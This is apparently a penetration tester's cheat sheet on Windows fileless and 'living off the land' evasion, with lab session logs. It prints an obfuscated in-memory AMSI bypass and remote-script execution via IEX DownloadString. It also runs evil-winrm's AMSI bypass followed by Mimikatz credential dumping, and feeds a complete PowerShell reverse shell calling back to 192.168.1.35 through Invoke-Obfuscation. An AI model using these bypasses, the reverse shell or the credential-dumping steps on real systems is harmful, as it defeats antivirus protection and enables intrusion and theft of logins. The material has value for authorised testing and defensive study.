===================================================================================================================================
Living off the land and filess techniques
===================================================================================================================================

---------------------------------------------------------------
Why using 'living off the land and fileless' techniques ?
---------------------------------------------------------------
> The purpose of the 'living off the land and fileless' techniques is to avoid getting detected and blocked by the antivirus and end-point protection
  solutions installed on modern Windows machines during penetration tests by running scripts and shellcodes directly into memory and making use as much as possible
  of the sysadmin tools and software that already installed on targeted computers.
  
  The four main categories of living off the land and fileless attack techniques are: 
  - memory-only threats, 
  - fileless persistence, 
  - dual-use tools,
  - non-PE file attacks.

  In general, creating less new files on the hard disk means less chance of being detected by traditional security tools and therefore minimizes
  the risk of an attack being detected and blocked.

  Before executing a "hacking" and/or security audit scripts (e.g. '.ps1', '.vbs', '.bat') on a Windows machine is important to disable the Antimalware Scan Interface (AMSI)
  to avoid our scripts being scanned and potentially blocked by the AV installed on the Windows machine.

---------------------------------------------------------------
Microsoft Antimalware Scan Interface (AMSI)
---------------------------------------------------------------
> The Microsoft Antimalware Scan Interface (AMSI) provides enhanced malware protection by allowing the Antivirus solution installed on a modern Windows machine
  (i.e. Windows 10/11 or Windows server 2016/2019) to scan the applications and scripts before they are executed. 
  
  For instance, the AMSI feature is integrated into these components of Windows 10 when they are executed:
  - User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
  - PowerShell (scripts, interactive use, and dynamic code evaluation)
  - Windows Script Host (wscript.exe and cscript.exe)
  - JavaScript and VBScript
  - Office VBA macros

> The Windows Antimalware Scan Interface (AMSI) is a versatile interface standard that allows the applications and services to integrate with any antimalware product
  that's present on a Windows machine (e.g. Windows Defender AntiVirus is enabled by default on Windows 10/11).
  AMSI is agnostic of antimalware vendor; it's designed to allow for the most common malware scanning and protection techniques provided
  by today's antimalware products that can be integrated into applications. 

> There are many techniques to bypass AMSI such as:
  - patching the amsi.dll in memory
  - setting the “amsiInitFailed” flag to prevent AMSI scanning capability for the current process (the strings 'AmsiUtils' & 'amsiInitFailed' are encoded to avoid the AV to detect and block the AMSI bypass)
  - forcing an error i.e. forcing the AMSI initialization to fail (amsiInitFailed) so no scan will be initiated for the current process
  - placing a separate amsi.dll in the current working directory
  - registry Key Modification
  The goal of attackers is to prevent a scan from taking place or to deliver a “clean” result and not being flagged as “malicious”. 

  Usefull links:
  - https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
  - https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/
 
---------------------------------------------------------------
Windows Security features
---------------------------------------------------------------
> Microsoft has added some security features in PowerShell v5 to help out the Blue teams such as: 
  - Constrained Language Mode, 
  - Deep Scriptblock logging, 
  - system wide transcripts,
  - Antimalware Scan Interface (AMSI)  
  - ...

> Other classic defenses:
  + Windows Defender 
    - Real-Time protection and Antimalware Scan Interface (AMSI) 
    - Tamper protection (prevents other form tampering with important security features)
  + AppLocker
  + Software Restriction Policy

  Note: Microsoft has introduced Credential Guard in Windows 10 Enterprise and Windows Server 2016, which uses virtualization-based security to isolate secrets,
  and it is effective in preventing Mimikatz from retrieving hashes directly from memory.


================================================================================================================================================
1. Examples of manual AMSI and AV bypass techniques 
================================================================================================================================================

Test 1 - Manual AMSI bypass as a low privileged user locally logged on a Windows 10 laptop with Defender (AV) enabled and up-to-date
------------------------------------------------------------------------------------------------------------------------------------------------

Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\auditor> powershell -exec bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Users\auditor> net user auditor
User name                    auditor
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            11/21/2021 4:48:04 AM
Password expires             1/2/2022 4:48:04 AM
Password changeable          11/21/2021 4:48:04 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   11/21/2021 4:52:08 AM

Logon hours allowed          All

Local Group Memberships      *Users
Global Group memberships     *None
The command completed successfully.

PS C:\temp> cd c:\temp

PS C:\temp> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
<SNIP>
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParseException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent

PS C:\temp> $Hxl=$null;
PS C:\temp> $xqhoooo="$([cHAr](83*54/54)+[CHAR]([bYTe]0x79)+[chaR]([BytE]0x73)+[cHAR]([ByTE]0x74)+[chAR]([BYte]0x65)+[chAr]([BYTE]0x6d)).$(('Mänäg'+'ement').NORmAlize([ChAr](13+57)+[cHAr]([BytE]0x6f)+[CHAR](40+74)+[cHaR](92+17)+[CHAr](68+27-27)) -replace [ChAr]([BYte]0x5c)+[CHar](112)+[chAR]([byte]0x7b)+[chAr](77*64/64)+[ChaR](110)+[char](125*63/63)).$(('Autóm'+'âtíon').nOrmALIZE([char]([BYtE]0x46)+[CHAr]([BYtE]0x6f)+[ChaR](114+1-1)+[ChaR]([ByTe]0x6d)+[chaR](68)) -replace [cHar]([ByTE]0x5c)+[cHAR]([bYTe]0x70)+[cHAR]([byTe]0x7b)+[cHAR]([byte]0x4d)+[CHar](110+94-94)+[cHAR]([BYtE]0x7d)).$([chAR]([bYTE]0x41)+[CHAR]([byTE]0x6d)+[ChAR]([ByTE]0x73)+[chaR](105+6-6)+[ChaR](85+23-23)+[cHAR](116*86/86)+[cHar](105)+[cHar]([BYtE]0x6c)+[cHAr](115))";
PS C:\temp> $wpkfsoadsfehqpe="+[cHAR]([bytE]0x72)+[ChAr](121)+[chAR]([bYtE]0x79)+[cHar](97+3)+[cHar](121+41-41)+[cHAr]([bYte]0x6f)+[cHar]([BYTe]0x66)+[chAr](107+87-87)+[chAr]([BYTE]0x69)";
PS C:\temp> [Threading.Thread]::Sleep(286);
PS C:\temp> [Ref].Assembly.GetType($xqhoooo).GetField($([char](71+26)+[char]([BYtE]0x6d)+[CHar]([byte]0x73)+[chaR](105+75-75)+[CHar]([ByTe]0x49)+[chAr]([bytE]0x6e)+[CHar](37+68)+[cHAr](116+2-2)+[Char](70+37-37)+[char](97)+[chAR]([BYTE]0x69)+[chaR](93+15)+[CHAr]([byte]0x65)+[char](100)),"NonPublic,Static").SetValue($Hxl,$true);

PS C:\temp> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks

[*] Running Invoke-AllChecks
[*] Checking if user is in a local group with administrative privileges...
[*] Checking for unquoted service paths...
[*] Checking service executable and argument permissions...
[*] Checking service permissions...
[*] Checking %PATH% for potentially hijackable .dll locations...
HijackablePath : C:\Users\auditor\AppData\Local\Microsoft\WindowsApps\
AbuseFunction  : Write-HijackDll -OutputFile 'C:\Users\auditor\AppData\Local\Microsoft\WindowsApps\\wlbsctrl.dll'
                 -Command '...'

[*] Checking for AlwaysInstallElevated registry key...
[*] Checking for Autologon credentials in registry...
[*] Checking for vulnerable registry autoruns and configs...
[*] Checking for vulnerable schtask files/configs...
[*] Checking for unattended install files...
[*] Checking for encrypted web.config strings...
[*] Checking for encrypted application pool and virtual directory passwords...

PS C:\temp>


Test 2 - Manual AMSI bypass as a local admin user remotely logged on a Window 10 Laptop with Defender (AV) enabled and up-to-date
------------------------------------------------------------------------------------------------------------------------------------------------

PS C:\> Enter-PSSession -Computername server02.Security-Test-Lab.Local -Credential server02\administrator
[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents> 

=> Note: Without disabling the AMSI, the script 'Invoke-Rubeus.ps1' is detected and blocked by Windows Defender...

[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents> . .\Invoke-Rubeus.ps1
At C:\Users\Administrator.PO718687\Documents\Tools-AD\Invoke-Rubeus.ps1:1 char:1
+ function Invoke-Rubeus([string]$Command)
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParseException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent

=> Note: Let's disable it.

[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents> 
[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents> $Hxl=$null;
[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents> $xqhoooo="$([cHAr](83*54/54)+[CHAR]([bYTe]0x79)+[chaR]([BytE]0x73)+[cHAR]([ByTE]0x74)+[chAR]([BYte]0x65)+[chAr]([BYTE]0x6d)).$(('Mänäg'+'ement').NORmAlize([ChAr](13+57)+[cHAr]([BytE]0x6f)+[CHAR](40+74)+[cHaR](92+17)+[CHAr](68+27-27)) -replace [ChAr]([BYte]0x5c)+[CHar](112)+[chAR]([byte]0x7b)+[chAr](77*64/64)+[ChaR](110)+[char](125*63/63)).$(('Autóm'+'âtíon').nOrmALIZE([char]([BYtE]0x46)+[CHAr]([BYtE]0x6f)+[ChaR](114+1-1)+[ChaR]([ByTe]0x6d)+[chaR](68)) -replace [cHar]([ByTE]0x5c)+[cHAR]([bYTe]0x70)+[cHAR]([byTe]0x7b)+[cHAR]([byte]0x4d)+[CHar](110+94-94)+[cHAR]([BYtE]0x7d)).$([chAR]([bYTE]0x41)+[CHAR]([byTE]0x6d)+[ChAR]([ByTE]0x73)+[chaR](105+6-6)+[ChaR](85+23-23)+[cHAR](116*86/86)+[cHar](105)+[cHar]([BYtE]0x6c)+[cHAr](115))";
[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents> $wpkfsoadsfehqpe="+[cHAR]([bytE]0x72)+[ChAr](121)+[chAR]([bYtE]0x79)+[cHar](97+3)+[cHar](121+41-41)+[cHAr]([bYte]0x6f)+[cHar]([BYTe]0x66)+[chAr](107+87-87)+[chAr]([BYTE]0x69)";
[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents> [Threading.Thread]::Sleep(286);
[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents> [Ref].Assembly.GetType($xqhoooo).GetField($([char](71+26)+[char]([BYtE]0x6d)+[CHar]([byte]0x73)+[chaR](105+75-75)+[CHar]([ByTe]0x49)+[chAr]([bytE]0x6e)+[CHar](37+68)+[cHAr](116+2-2)+[Char](70+37-37)+[char](97)+[chAR]([BYTE]0x69)+[chaR](93+15)+[CHAr]([byte]0x65)+[char](100)),"NonPublic,Static").SetValue($Hxl,$true);
[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents>
[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents>  . .\Invoke-Rubeus.ps1
[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents>  Invoke-Rubeus
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4
<SNIP>

=> It is working.


===================================================================================================================================================
2. Examples of AMSI and AV bypass using the tool EVIL-WINRM (in Kali)
===================================================================================================================================================

Test 1 - AMSI bypass with the tool evil-winrm running with a local admin account on a Windows 2016 server with Defender (AV) enabled and up-to-date
---------------------------------------------------------------------------------------------------------------------------------------------------

$ evil-winrm -u Administrator -p Test1234 -i 192.168.1.38 -s '/home/kali/Documents/'                                    

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> menu
The term 'Menu' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ Menu
+ ~~~~
    + CategoryInfo          : ObjectNotFound: (Menu:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException[+] Bypass-4MSI
[+] services
[+] upload
[+] download
[+] menu
[+] exit

Evil-WinRM* PS C:\Users\Administrator\Documents> systeminfo

Host Name:                 WIN-DV7MRN2F7E8
OS Name:                   Microsoft Windows Server 2016 Standard Evaluation
OS Version:                10.0.14393 N/A Build 14393
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00378-00000-00000-AA739
Original Install Date:     11/27/2021, 1:32:54 PM
System Boot Time:          11/27/2021, 5:03:20 PM
System Manufacturer:       innotek GmbH
System Model:              VirtualBox
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 142 Stepping 10 GenuineIntel ~1896 Mhz
BIOS Version:              innotek GmbH VirtualBox, 12/1/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              fr;French (France)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     2,048 MB
Available Physical Memory: 1,028 MB
Virtual Memory: Max Size:  3,200 MB
Virtual Memory: Available: 2,039 MB
Virtual Memory: In Use:    1,161 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\WIN-DV7MRN2F7E8
<SNIP>

*Evil-WinRM* PS C:\Users\Administrator\Documents> Get-MpComputerStatus

AMEngineVersion                 : 1.1.18700.4
AMProductVersion                : 4.10.14393.0
AMServiceEnabled                : True
AMServiceVersion                : 4.10.14393.0
AntispywareEnabled              : True
AntispywareSignatureAge         : 0
AntispywareSignatureLastUpdated : 11/27/2021 8:25:18 AM
AntispywareSignatureVersion     : 1.353.1705.0
AntivirusEnabled                : True
AntivirusSignatureAge           : 0
AntivirusSignatureLastUpdated   : 11/27/2021 8:25:21 AM
AntivirusSignatureVersion       : 1.353.1705.0
BehaviorMonitorEnabled          : True
ComputerID                      : 118D02EB-A8E0-46AE-9437-9C89C2ABB59F
ComputerState                   : 0
FullScanAge                     : 4294967295
FullScanEndTime                 :
FullScanStartTime               :
IoavProtectionEnabled           : True
LastFullScanSource              : 0
LastQuickScanSource             : 0
NISEnabled                      : True
NISEngineVersion                : 2.1.14600.4
NISSignatureAge                 : 4294967295
NISSignatureLastUpdated         :
NISSignatureVersion             : 119.0.0.0
OnAccessProtectionEnabled       : True
QuickScanAge                    : 4294967295
QuickScanEndTime                :
QuickScanStartTime              :
RealTimeProtectionEnabled       : True
RealTimeScanDirection           : 0
PSComputerName                  :


*Evil-WinRM* PS C:\Users\Administrator\Documents> Bypass-4MSI

Warning: AV could be still watching for suspicious activity. Waiting for patching...

[+] Success!

*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Mimikatz.ps1
*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Mimikatz

  .#####.   mimikatz 2.2.0 (x64) #19041 Jul 24 2021 11:00:11
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # sekurlsa::logonpasswords

Authentication Id : 0 ; 40930 (00000000:00009fe2)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 11/27/2021 3:31:07 PM
SID               : S-1-5-90-0-1
        msv :
        tspkg :
        wdigest :
         * Username : WIN-DV7MRN2F7E8$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

<SNIP>

=> It worked !


Test 2 - AMSI bypass with the tool evil-winrm running with a local admin account on a Windows 10 laptop with Defender (AV) enabled and up-to-date
-------------------------------------------------------------------------------------------------------------------------------------------------

┌──(kali㉿kali)-[~/Documents]
└─$ evil-winrm -u administrator -p 'Password123!' -i 192.168.1.35 -s '/home/kali/Documents/' -e '/home/kali/Documents/x64/'

Evil-WinRM shell v3.3
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> menu
The term 'Menu' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ Menu
[+] Dll-Loader 
[+] Donut-Loader 
[+] Invoke-Binary
[+] Bypass-4MSI
[+] services
[+] upload
[+] download
[+] menu
[+] exit

=> Note: Without disabling the AMSI, 'mimikatz.exe' and 'Invoke-Mimkatz.ps1' are detected and blocked by Windows Defender...

*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Binary /home/kali/Documents/x64/mimikatz.exe
At line:1 char:1
+ Invoke-Binary TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAA ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand

*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Mimikatz.ps1

*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Mimikatz
At line:1 char:1
+ Invoke-Mimikatz
+ ~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand


=> Note: Let's try the AMSI bypass feature of Evil-WinRM...

*Evil-WinRM* PS C:\Users\Administrator\Documents> Bypass-4MSI
[+] Success!

Error: An error of type WinRM::WinRMWSManFault happened, message is [WSMAN ERROR CODE: 1726]: <f:WSManFault Code='1726' Machine='192.168.1.35' xmlns:f='http://schemas.microsoft.com/wbem/wsman/1/wsmanfault'><f:Message>The WSMan provider host process did not return a proper response.  A provider in the host process may have behaved improperly. </f:Message></f:WSManFault>

Error: Exiting with code 1

Error: Exiting with code 1


=> Note: The "Bypass-4MSI" feature is not working. It is detected by Windows Defender and the WinRM connection is shutdown.

Windows Defender messages
=========================

HackTool:Win32/Mikatz!dha
Alert level: High
Status: Active
Date: 23/11/2021 01:32
Category: Tool
Details: This program has potentially unwanted behaviour
Learn more
Affected items:
	amsi: \Device\HarddiskVolume3\Windows\System32\wsmprovhost.exe
	
Trojan:PowerShell/PSAttackTool.A
Alert level: Severe
Status: Active
Date: 23/11/2021 01:35
Category: Trojan
Details: This program is dangerous and executes commands from an attacker.
Learn more
Affected items:
	amsi: \Device\HarddiskVolume3\Windows\System32\wsmprovhost.exe


===================================================================================================================================================
3. Example of AMSI and AV bypass using the tool Invoke-Obfuscation
===================================================================================================================================================

=> URL: https://github.com/danielbohannon/Invoke-Obfuscation

PS C:\Users\Administrator\Documents\Tools-AD\Invoke-Obfuscation-master> powershell -exec bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Users\Administrator.PO718687\Documents\Tools-AD\Invoke-Obfuscation-master> Import-Module .\Invoke-Obfuscation.psd1

PS C:\Users\Administrator.PO718687\Documents\Tools-AD\Invoke-Obfuscation-master> Invoke-obfuscation

IEX( ( '36{78Q55@32t61_91{99@104X97{114Q91-32t93}32t93}32t34@110m111@105}115X115-101m114_112@120@69-45{101@107X111m118m110-73Q124Q32X41Q57@51-93Q114_97_104t67t91{44V39Q112_81t109@39}101{99@97}108{112}101}82_45m32_32X52{51Q93m114@97-104{67t91t44t39V98t103V48t39-101}99}97V108}112t101_82_45{32@41X39{41_112t81_109_39m43{39-110t101@112{81t39X43@39t109_43t112_81Q109t101X39Q43m39}114Q71_112{81m109m39@43X39V32Q40}32m39_43_39{114-111m108t111t67{100m110{117Q39_43m39-111-114Q103_101t114@39m43-39{111t70-45}32m41}98{103V48V110Q98t103{48@39{43{39-43{32t98m103_48{111@105t98@103V48-39@43{39_32-32V43V32}32t98t103@48X116m97V99t98X103t48_39V43m39@43-39X43Q39_98@103@48}115V117V102Q98V79m45@98m39Q43{39X103_39X43Q39V48}43-39}43t39}98-103{48V101_107Q39t43X39_111X118X110V39X43}39t98_103{48@43}32_98{103}48{73{98-39@43t39m103_39}43{39{48Q32t39X43X39-32{40V32t41{39Q43V39m98X103{39_43V39{48-116{115Q79{39_43_39}98}103m48{39Q43t39X32X43{32_98@103-39@43m39X48_72-39_43t39V45m39t43Q39_101Q98}103_48-32_39Q43V39V32t39V43}39m43Q32V98X39Q43_39@103_48V39@43Q39@116X73t82V119m98-39{43_39}103Q48X40_46_32m39}40_40{34t59m91@65V114V114@97_121}93Q58Q58V82Q101Q118Q101{114}115_101m40_36_78m55@32t41t32-59{32}73{69V88m32{40t36V78t55}45Q74m111@105-110m32X39V39-32}41'.SpLiT( '{_Q-@t}mXV' ) |ForEach-Object { ([Int]$_ -AS [Char]) } ) -Join'' )
  |    |    |    |
  |    |    |    |
 \ /  \ /  \ /  \ /
  V    V    V    V
$N7 =[char[ ] ] "noisserpxE-ekovnI| )93]rahC[,'pQm'ecalpeR-  43]rahC[,'bg0'ecalpeR- )')pQm'+'nepQ'+'m+pQme'+'rGpQm'+' ( '+'roloCdnu'+'orger'+'oF- )bg0nbg0'+'+ bg0oibg0'+'  +  bg0tacbg0'+'+'+'bg0sufbO-b'+'g'+'0+'+'bg0ek'+'ovn'+'bg0+ bg0Ib'+'g'+'0 '+' ( )'+'bg'+'0tsO'+'bg0'+' + bg'+'0H'+'-'+'ebg0 '+' '+'+ b'+'g0'+'tIRwb'+'g0(. '((";[Array]::Reverse($N7 ) ; IEX ($N7-Join '' )
  |    |    |
  |    |    |
 \ /  \ /  \ /
  V    V    V
.("wRIt" +  "e-H" + "Ost") (  "I" +"nvoke"+"-Obfus"+"cat"  +  "io" +"n") -ForegroundColor ( 'Gre'+'en')
  |    |
  |    |
 \ /  \ /
  V    V
Write-Host "Invoke-Obfuscation" -ForegroundColor Green
  |
  |
 \ /
  V
Invoke-Obfuscation
            ____                 __
           /  _/___ _   ______  / /_____
           / // __ \ | / / __ \/ //_/ _ \______
         _/ // / / / |/ / /_/ / ,< /  __/_____/
        /______ /__|_________/_/|_|\___/         __  _
          / __ \/ /_  / __/_  ________________ _/ /_(_)___  ____
         / / / / __ \/ /_/ / / / ___/ ___/ __ `/ __/ / __ \/ __ \
        / /_/ / /_/ / __/ /_/ (__  ) /__/ /_/ / /_/ / /_/ / / / /
        \____/_.___/_/  \__,_/____/\___/\__,_/\__/_/\____/_/ /_/

        Tool    :: Invoke-Obfuscation
        Author  :: Daniel Bohannon (DBO)
        Twitter :: @danielhbohannon
        Blog    :: http://danielbohannon.com
        Github  :: https://github.com/danielbohannon/Invoke-Obfuscation
        Version :: 1.8
        License :: Apache License, Version 2.0
        Notes   :: If(!$Caffeinated) {Exit}

HELP MENU :: Available options shown below:

[*]  Tutorial of how to use this tool             TUTORIAL
[*]  Show this Help Menu                          HELP,GET-HELP,?,-?,/?,MENU
[*]  Show options for payload to obfuscate        SHOW OPTIONS,SHOW,OPTIONS
[*]  Clear screen                                 CLEAR,CLEAR-HOST,CLS
[*]  Execute ObfuscatedCommand locally            EXEC,EXECUTE,TEST,RUN
[*]  Copy ObfuscatedCommand to clipboard          COPY,CLIP,CLIPBOARD
[*]  Write ObfuscatedCommand Out to disk          OUT
[*]  Reset ALL obfuscation for ObfuscatedCommand  RESET
[*]  Undo LAST obfuscation for ObfuscatedCommand  UNDO
[*]  Go Back to previous obfuscation menu         BACK,CD ..
[*]  Quit Invoke-Obfuscation                      QUIT,EXIT
[*]  Return to Home Menu                          HOME,MAIN


Choose one of the below options:

[*] TOKEN       Obfuscate PowerShell command Tokens
[*] AST         Obfuscate PowerShell Ast nodes (PS3.0+)
[*] STRING      Obfuscate entire command as a String
[*] ENCODING    Obfuscate entire command via Encoding
[*] COMPRESS    Convert entire command to one-liner and Compress
[*] LAUNCHER    Obfuscate command args w/Launcher techniques (run once at end)


Invoke-Obfuscation>

Invoke-Obfuscation> set scriptblock & {$ps=$false;$hostip='192.168.1.35';$port=80;$client = New-Object System.Net.Sockets.TCPClient($hostip,$port);$stream = $client.GetStream();[byte[]]$bytes = 0..50000|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$cmd=(get-childitem Env:ComSpec).value;$inArray=$data.split();$item=$inArray[0];if(($item -eq '$ps') -and ($ps -eq $false)){$ps=$true}if($item -like '?:'){$item='d:'}$myArray=@('cd','exit','d:','pwd','ls','ps','rm','cp','mv','cat');$do=$false;foreach ($i in $myArray){if($item -eq $i){$do=$true}}if($do -or $ps){$sendback=( iex $data 2>&1 |Out-String)}else{$data2='/c '+$data;$sendback = ( &$cmd $data2 2>&1 | Out-String)};if($ps){$prompt='PS ' + (pwd).Path}else{$prompt=(pwd).Path}$sendback2 = $data + $sendback + $prompt + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}

Successfully set ScriptBlock:
& {$ps=$false;$hostip='192.168.1.35';$port=80;$client = New-Object System.Net.Sockets.TCPClient($hostip,$port);$stream = $client.GetStream();[byte[]]$bytes = 0..50000|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$cmd=(get-childitem Env:ComSpec).value;$inArray=$data.split();$item=$inArray[0];if(($item -eq '$ps') -and ($ps -eq $false)){$ps=$true}if($item -like '?:'){$item='d:'}$myArray=@('cd','exit','d:','pwd','ls','ps','rm','cp','mv','cat');$do=$false;foreach ($i in $myArray){if($item -eq $i){$do=$true}}if($do -or $ps){$sendback=( iex $data 2>&1 |Out-String)}else{$data2='/c '+$data;$sendback = ( &$cmd $data2 2>&1 | Out-String)};if($ps){$prompt='PS ' + (pwd).Path}else{$prompt=(pwd).Path}$sendback2 = $data + $sendback + $prompt + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}

Invoke-Obfuscation> STRING

Choose one of the below String options to APPLY to current payload:

[*] STRING\1    Concatenate entire command
[*] STRING\2    Reorder entire command after concatenating
[*] STRING\3    Reverse entire command after concatenating

Invoke-Obfuscation\String> 2

Executed:
  CLI:  String\2
  FULL: Out-ObfuscatedStringCommand -ScriptBlock $ScriptBlock 2

Result:
&((Gv '*MDr*').NAme[3,11,2]-jOIN'')( ((("{23}{5}{14}{18}{31}{3}{9}{4}{7}{19}{28}{13}{29}{12}{22}{35}{32}{2}{0}{33}{11}{21}{30}{8}{15}{20}{16}{26}{34}{25}{1}{24}{17}{27}{6}{10}" -f 'nd (SfLps -','endback + SfLprompt + 4rT> 4rT;SfL','Litem -eq 4rTSfLps4rT) -a','m.Net.Sockets.TC','tip,SfLport);Sf','Lps=SfLfalse;SfLhostip=4rT192.','stream.Write(SfLsen','Lstream = SfLclient',' SfLmyArra','PClient(SfLhos','dbyte,0,SfLsendbyte.Length);SfLstream.Flush()};SfLclient.Close()}','wd4rT,4rTls4rT,4rTps4rT,4rTrm4rT,4r','SfLd','003mA%{0};while((SfLi = SfLstream.Read(SfLbytes, 0, SfLbytes.Length)) ','168.1.354rT;S','y){if(SfLitem -eq SfLi){SfLdo=SfLtrue}}if(SfLdo -or SfLps){SfLsendback=(','+','dbyte = ([text.encoding]::ASCII).GetBytes(SfLsendbac','fLport=80;SfLclient = New-Object Sys','.GetStream();[',' iex SfLdata 2>&1 3mAOut-String)}else{SfLdata2=4rT/c 4rT','Tcp4rT,4rTmv4rT,4rTcat4r','ata = (New-Object -TypeName System.Text.ASCIIEncoding).GetString','& {Sf','sen',' = SfLdata + SfLs','SfLdata;SfLsendback = ( &SfLcmd SfLdata2 2>&1 3mA Out-String)};if(SfLps){SfLprompt=4','k2);SfL','byte[]]SfLbytes = 0..500','-ne 0){','T);SfLdo=SfLfalse;foreach (SfLi in','te','LinArray[0];if((Sf','eq SfLfalse)){SfLps=SfLtrue}if(SfLitem -like 4rT?:4rT){SfLitem=4rTd:4rT}SfLmyArray=@(4rTcd4rT,4rTexit4rT,4rTd:4rT,4rTp','rTPS 4rT + (pwd).Path}else{SfLprompt=(pwd).Path}SfLsendback2','(SfLbytes,0, SfLi);SfLcmd=(get-childitem Env:ComSpec).value;SfLinArray=SfLdata.split();SfLitem=Sf')) -crEpLACE  ([cHaR]52+[cHaR]114+[cHaR]84),[cHaR]39  -rePLACE 'SfL',[cHaR]36  -crEpLACE'3mA',[cHaR]124) )

Choose one of the below String options to APPLY to current payload:

[*] STRING\1    Concatenate entire command
[*] STRING\2    Reorder entire command after concatenating
[*] STRING\3    Reverse entire command after concatenating

Invoke-Obfuscation\String> BACK

Choose one of the below options:

[*] TOKEN       Obfuscate PowerShell command Tokens
[*] AST         Obfuscate PowerShell Ast nodes (PS3.0+)
[*] STRING      Obfuscate entire command as a String
[*] ENCODING    Obfuscate entire command via Encoding
